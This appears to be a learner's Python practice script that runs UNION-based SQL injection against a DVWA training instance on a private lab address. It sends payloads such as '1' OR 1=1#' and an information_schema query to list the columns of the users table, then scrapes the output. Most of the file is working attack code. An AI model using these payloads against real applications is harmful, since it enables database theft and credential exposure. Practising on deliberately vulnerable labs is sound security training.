import requests
import pandas as pd
import re
import sys
import os
import time
import random
import json
from bs4 import BeautifulSoup



header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Cookie": "security=low; PHPSESSID=631b805cf75583b44a23b1761d31047c",
    "Referer": "http://192.168.36.129/dvwa/vulnerabilities/sqli",
    "Connection": "close"
}


# target = target % ("\" union select --")
nums = ["1","2","3",'4','5','6','7','8','9']
    
"""
    database name : dvwa
    # Table
    table: guestbook
    - admin
    - comment_id
    - comment
    - name
    
    table : users
    - admin
    - user_id
    - first_name
    - last_name
    - user
    - password
    - avatar
    
"""
# print( target )
target = "http://192.168.36.129/dvwa/vulnerabilities/sqli/"
# 

params = { 
        #   "id" : "1' OR 1=1#",
            # "id" : "1' union select database(),1 #",
            "id" : "1' union select 1, column_name from information_schema.columns where table_name = 'users' #",
          "Submit" : "Submit#" 
          }

ptn = re.compile(r"Surname: ([a-zA-Z0-9_]+)")

res = requests.get( target , headers=header, params=params )
soup = BeautifulSoup( res.text, "html.parser" )



for j in soup.find_all("pre") :
    for i in ptn.findall( j.text ) :
        print(i)

# for i in range(1, 9) :

#     target = "http://192.168.36.129/dvwa/vulnerabilities/sqli/?id=%s&Submit=Submit#"
    
#     target = target % ( ( "' union select " + ", ".join( nums[:i] ) + " #" ) )
    
#     res = requests.get( target , headers=header)
#     soup = BeautifulSoup( res.text, "html.parser" )

#     print( soup.find_all("pre")  )

